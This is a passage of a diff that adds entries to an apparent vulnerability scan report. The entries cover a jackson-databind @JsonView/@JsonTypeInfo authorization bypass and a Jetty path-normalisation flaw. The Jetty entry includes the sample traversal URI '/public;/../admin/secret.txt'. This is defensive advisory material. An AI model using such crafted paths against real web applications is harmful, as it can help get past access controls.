+        View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot
+        REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing
+        the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.
+
+      - CWE-863 (Incorrect Authorization)
+      - Same impact class as CVE-2026-54517 / CVE-2026-54518
+      - No RCE, no DoS — this is an access-control / mass-assignment bypass
+
+      ### Trigger Conditions
+
+      Developer code must combine (no opt-in user configuration required):
+
+      1. Property-based @JsonCreator on the outer type
+      2. A creator parameter annotated with @JsonView(RestrictedView.class)
+      3. The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property="...")
+    Severity: MEDIUM
+    VendorSeverity:
+      ghsa: 2
+    CVSS:
+      ghsa:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+        V3Score: 6.5
+    References:
+    - https://github.com/FasterXML/jackson-databind
+    - https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed
+    - https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c
+    - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w
+    PublishedDate: '2026-07-21T19:40:12Z'
+    LastModifiedDate: '2026-07-21T19:40:12Z'
+  - VulnerabilityID: CVE-2026-8384
+    VendorIDs:
+    - GHSA-w7x5-g22v-xqhr
+    PkgName: org.eclipse.jetty:jetty-util
+    PkgPath: openaf/openaf.jar
+    PkgIdentifier:
+      PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.8
+      UID: e793b260df8ee45b
+    InstalledVersion: 12.1.8
+    FixedVersion: 12.0.35, 12.1.9
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    SeveritySource: ghsa
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-8384
+    DataSource:
+      ID: ghsa
+      Name: GitHub Security Advisory Maven
+      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
+    Fingerprint: sha256:d3323bb3888944b1f71f6d23a4bf005743f1f0c1a37819afb95d8ef0f489ed14
+    Title: 'In Eclipse Jetty, an HTTP URI of this form:      /public;/../admin/sec ...'
+    Description: |-
+      In Eclipse Jetty, an HTTP URI of this form:
+
+
+
+
+
+      /public;/../admin/secret.txt
+
+
+
+
+
+
+
+
+      results in an unresolved path of:
+
+
+
+
+
+      /public/../admin/secret.txt
+
+
+
+
+
+
+
+
+      instead of the expected:
+
+
+
+
+
+      /admin/secret.txt
+
+
+
+
+
+
+
+
+      Jetty itself is not affected, as it will not serve the secret.txt file because it will not pass the alias checker (only resolved resources are served).
+
+
+
+
+      However, web applications that rely on resolved paths being provided by Jetty may be confused when receiving an unresolved path.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-647
+    VendorSeverity:
+      ghsa: 2
+    CVSS:
+      ghsa:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+        V3Score: 5.3
+    References:
+    - https://github.com/jetty/jetty.project
+    - https://github.com/jetty/jetty.project/commit/82969c77f6da46e27008b10b3c14840cd31db084
+    - https://github.com/jetty/jetty.project/commit/ade27ce93a37c33278720250d85c48601230ae3f
+    - https://github.com/jetty/jetty.project/pull/14969
+    - https://github.com/jetty/jetty.project/pull/14973
+    - https://github.com/jetty/jetty.project/releases/tag/jetty-12.0.35
+    - https://github.com/jetty/jetty.project/releases/tag/jetty-12.1.9
+    - https://github.com/jetty/jetty.project/security/advisories/GHSA-w7x5-g22v-xqhr
+    - https://gitlab.eclipse.org/security/cve-assignment/-/work_items/108
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-8384
+    PublishedDate: '2026-07-14T09:16:42.05Z'
+    LastModifiedDate: '2026-07-14T18:39:51.587Z'
